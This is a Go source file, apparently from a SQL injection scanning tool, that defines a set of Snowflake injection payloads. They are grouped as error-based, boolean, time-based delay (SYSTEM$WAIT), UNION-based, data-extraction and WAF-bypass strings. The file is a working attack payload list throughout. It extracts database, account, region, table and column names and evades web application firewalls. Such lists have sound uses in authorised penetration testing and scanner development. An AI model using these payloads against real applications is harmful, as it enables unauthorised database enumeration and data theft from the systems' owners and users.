package payloads

var Snowflake = PayloadGroup{
	DBMS: "Snowflake",
	Payloads: []Payload{
		// ═══════════════════════════════════════════
		// ERROR-BASED
		// ═══════════════════════════════════════════
		{Type: "error", Content: "' AND 1=CAST(CURRENT_DATABASE() AS SIGNED)--"},
		{Type: "error", Content: "' AND 1=CAST(CURRENT_USER() AS SIGNED)--"},
		{Type: "error", Content: "' AND 1=CAST(CURRENT_ACCOUNT() AS SIGNED)--"},
		{Type: "error", Content: "' AND 1=CAST(CURRENT_REGION() AS SIGNED)--"},
		{Type: "error", Content: "' AND 1=CAST(CURRENT_WAREHOUSE() AS SIGNED)--"},
		{Type: "error", Content: "' AND 1=CAST((SELECT DATABASE_NAME FROM INFORMATION_SCHEMA.DATABASES LIMIT 1) AS SIGNED)--"},
		{Type: "error", Content: "' AND 1=CAST((SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES LIMIT 1) AS SIGNED)--"},
		{Type: "error", Content: "' AND 1=CAST((SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS LIMIT 1) AS SIGNED)--"},

		// ═══════════════════════════════════════════
		// BOOLEAN-BASED
		// ═══════════════════════════════════════════
		{Type: "boolean", Content: "' AND 1=1--", Expected: "true"},
		{Type: "boolean", Content: "' AND 1=2--", Expected: "false"},
		{Type: "boolean", Content: "' AND (SELECT 1)=(SELECT 1)--", Expected: "true"},
		{Type: "boolean", Content: "' AND (SELECT 1)=(SELECT 2)--", Expected: "false"},
		{Type: "boolean", Content: "') AND 1=1--", Expected: "true"},
		{Type: "boolean", Content: "') AND 1=2--", Expected: "false"},

		// ═══════════════════════════════════════════
		// TIME-BASED (Snowflake uses SYSTEM$WAIT)
		// ═══════════════════════════════════════════
		{Type: "time", Content: "' AND SYSTEM$WAIT(5)--"},
		{Type: "time", Content: "' AND SYSTEM$WAIT(10, 'SECONDS')--"},
		{Type: "time", Content: "'; CALL SYSTEM$WAIT(5)--"},
		{Type: "time", Content: "'); CALL SYSTEM$WAIT(5)--"},
		{Type: "time", Content: "'; SELECT SYSTEM$WAIT(5)--"},
		{Type: "time", Content: "' OR SYSTEM$WAIT(5)--"},
		{Type: "time", Content: "' UNION SELECT SYSTEM$WAIT(5)--"},

		// ═══════════════════════════════════════════
		// UNION-BASED
		// ═══════════════════════════════════════════
		{Type: "union", Content: "' UNION SELECT 1--"},
		{Type: "union", Content: "' UNION SELECT 1,2--"},
		{Type: "union", Content: "' UNION SELECT 1,2,3--"},
		{Type: "union", Content: "' UNION SELECT 1,2,3,4--"},
		{Type: "union", Content: "' UNION SELECT 1,2,3,4,5--"},
		{Type: "union", Content: "' UNION ALL SELECT NULL,NULL,NULL--"},
		{Type: "union", Content: "') UNION SELECT 1,2,3--"},
		{Type: "union", Content: "') UNION SELECT 1,2,3,4--"},

		// ═══════════════════════════════════════════
		// DATA EXTRACTION
		// ═══════════════════════════════════════════
		{Type: "deep", Content: "' UNION SELECT DATABASE_NAME FROM INFORMATION_SCHEMA.DATABASES--"},
		{Type: "deep", Content: "' UNION SELECT TABLE_SCHEMA||'.'||TABLE_NAME FROM INFORMATION_SCHEMA.TABLES--"},
		{Type: "deep", Content: "' UNION SELECT COLUMN_NAME||':'||DATA_TYPE FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='users'--"},
		{Type: "deep", Content: "' UNION SELECT CURRENT_DATABASE()--"},
		{Type: "deep", Content: "' UNION SELECT CURRENT_USER()--"},
		{Type: "deep", Content: "' UNION SELECT CURRENT_ACCOUNT()--"},
		{Type: "deep", Content: "' UNION SELECT CURRENT_REGION()--"},
		{Type: "deep", Content: "' UNION SELECT CURRENT_VERSION()--"},

		// ═══════════════════════════════════════════
		// WAF BYPASS
		// ═══════════════════════════════════════════
		{Type: "bypass", Content: "'/**/UNION/**/SELECT/**/NULL--"},
		{Type: "bypass", Content: "'%09UNION%09SELECT%09NULL--"},
		{Type: "bypass", Content: "'%0AOR%0A1%3D1--"},
	},
}

